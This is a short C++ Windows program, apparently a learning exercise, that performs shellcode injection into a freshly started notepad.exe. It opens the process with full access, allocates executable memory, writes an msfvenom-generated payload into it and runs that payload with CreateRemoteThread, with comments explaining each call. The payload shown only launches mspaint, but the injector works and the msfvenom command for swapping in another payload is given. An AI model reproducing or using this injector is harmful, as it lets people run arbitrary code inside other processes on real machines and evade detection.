#include <windows.h>
#include <iostream>
unsigned char shellcode[] =//msfvenom --platform windows --arch x64 EXITFUNC-thread -p windows/x64/exec CMD="cmd.exe /c mspaint" -f c --var-name=shellcode

"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6d\x73"
"\x70\x61\x69\x6e\x74\x00";
auto buffer = sizeof(shellcode);

int main()
{
    STARTUPINFOA what;// Window size, Program display data (text, background, etc)
    PROCESS_INFORMATION whatever; //Thread ID, Process ID (Procid), and handles for both.
    ZeroMemory(&what, sizeof(what));
    ZeroMemory(&whatever, sizeof(whatever));

    //Runs notepad, NULL, NULL, NULL, Not the same handle, Priority, Same enviorment, Diretory.                     Startup info & Process info after its executed.
    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, BELOW_NORMAL_PRIORITY_CLASS, NULL, NULL, &what, &whatever);

    DWORD NotepadID = whatever.dwProcessId;


    // Opens a new handle with all permissions to notepad. 
    HANDLE Notepadhandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, NotepadID);

    //Allocates virtual memory needed for the payload, Commit means to confirm that memory is ready to be used, Reserve means you will use it later, and not now.
    LPVOID baseaddr = VirtualAllocEx(Notepadhandle, NULL, buffer, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);//Execute read write means all permissions.

    //Writes the payload to the reserved memory. Do not need output
    WriteProcessMemory(Notepadhandle, baseaddr, shellcode, buffer, NULL);

    //Allows us to make a thread in notepad with the memory we alloacted, runs the payload.
    HANDLE Exechandle = CreateRemoteThread(Notepadhandle, NULL, 0, (LPTHREAD_START_ROUTINE)baseaddr, NULL, 0, NULL);

    //Waits for the Handle to the thread for the payload to completely execute.
    WaitForSingleObject(Exechandle, INFINITE);

    //closes the handle after the payload is executed.
    CloseHandle(Notepadhandle);
    CloseHandle(Exechandle);
}